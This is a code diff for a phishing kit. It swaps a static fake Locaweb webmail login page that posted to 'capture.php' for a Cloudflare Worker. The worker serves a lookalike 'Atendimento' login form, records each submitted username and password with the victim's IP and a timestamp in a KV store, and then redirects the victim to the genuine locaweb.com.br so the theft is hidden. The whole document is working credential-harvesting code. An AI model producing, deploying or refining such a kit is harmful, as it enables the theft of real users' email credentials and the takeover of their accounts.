@@ -1,44 +1,39 @@
-<!doctype html>
-<html lang="pt-BR">
-<head>
-<meta charset="utf-8"/>
-<title>Webmail – Locaweb</title>
+// arquivo: index.js
+const HTML=`<!DOCTYPE html>
+<html lang="pt-BR"><head>
+<meta charset="utf-8"/><title>Atendimento</title>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
-<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet"/>
-<style>
-html,body{height:100%;margin:0;font-family:'Open Sans',sans-serif;background:#f5f5f5}
-.wrapper{display:flex;flex-direction:column;height:100%}
-.header{width:100%;background:#e2231a;color:#fff;padding:22px 0;text-align:center;font-size:26px;font-weight:600;letter-spacing:.4px}
-.content{flex:1;display:flex;align-items:center;justify-content:center}
-.card{width:420px;background:#fff;border-radius:8px;box-shadow:0 8px 25px rgba(0,0,0,.10);padding:45px 50px}
-.card h2{margin:0 0 0;font-size:22px;color:#e2231a}
-.card p{margin:6px 0 0 14px;color:#555;font-size:14px}
-form{margin-top:28px}
-label{display:block;margin-bottom:6px;font-size:14px;color:#444}
-input{width:100%;padding:12px 14px;border:1px solid #ccc;border-radius:6px;font-size:15px;margin-bottom:18px}
-button{width:100%;padding:13px;background:#e2231a;color:#fff;border:0;border-radius:6px;font-size:16px;font-weight:600;cursor:pointer}
-button:hover{background:#b31c14}
-.footer{margin-top:22px;text-align:center;font-size:13px;color:#666}
-.footer a{color:#e2231a;text-decoration:none}
-</style>
-</head>
-<body>
-<div class="wrapper">
-  <div class="header">Webmail Locaweb</div>
-  <div class="content">
-    <div class="card">
-      <h2>Acesse sua conta</h2>
-      <p>Informe seus dados para entrar no webmail.</p>
-      <form action="capture.php" method="post" autocomplete="off">
-        <label for="user">Usuário</label>
-        <input id="user" name="user" required/>
-        <label for="pass">Senha</label>
-        <input id="pass" name="pass" type="password" required/>
-        <button type="submit">Entrar</button>
-      </form>
-      <div class="footer">Esqueceu a senha? <a href="#">Clique aqui</a></div>
-    </div>
-  </div>
+<style>body{font-family:Arial;background:#f2f2f2;display:flex;height:100vh;align-items:center;justify-content:center}.card{background:#fff;padding:35px 30px;border-radius:8px;box-shadow:0 4px 14px rgba(0,0,0,.15);width:340px;max-width:90%}h2{margin-top:0;text-align:center;color:#004680}input{width:100%;padding:12px;margin:8px 0 16px;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:12px;background:#0073bc;color:#fff;border:0;border-radius:4px;font-size:16px;cursor:pointer}button:hover{background:#005a9e}</style>
+</head><body>
+<div class="card">
+<h2>Entrar no Atendimento</h2>
+<form method="post" autocomplete="off">
+<input name="user" placeholder="Usuário" required/>
+<input name="pass" type="password" placeholder="Senha" required/>
+<button>Entrar</button>
+</form>
 </div>
-</body>
-</html>
+</body></html>`;
+
+addEventListener('fetch',e=>e.respondWith(handle(e.request)));
+
+async function handle(req){
+  const url=new URL(req.url);
+  // página inicial
+  if(req.method==='GET') return new Response(HTML,{headers:{'content-type':'text/html;charset=utf-8'}});
+
+  // recebe POST
+  if(req.method==='POST'){
+     const body=await req.formData();
+     const user=(body.get('user')||'').trim();
+     const pass=(body.get('pass')||'').trim();
+     const ip=req.headers.get('CF-Connecting-IP')||'0.0.0.0';
+     const ts=new Date().toLocaleString('pt-BR');
+     const linha=`${ts} | ${ip} | ${user} | ${pass}\n`;
+     // grava no KV
+     await ATENDIMENTO_KV.put(`log_${Date.now()}`,linha);
+     // redireciona pro alvo
+     return Response.redirect('https://locaweb.com.br',302);
+  }
+  return new Response('Not Found',{status:404});
+}
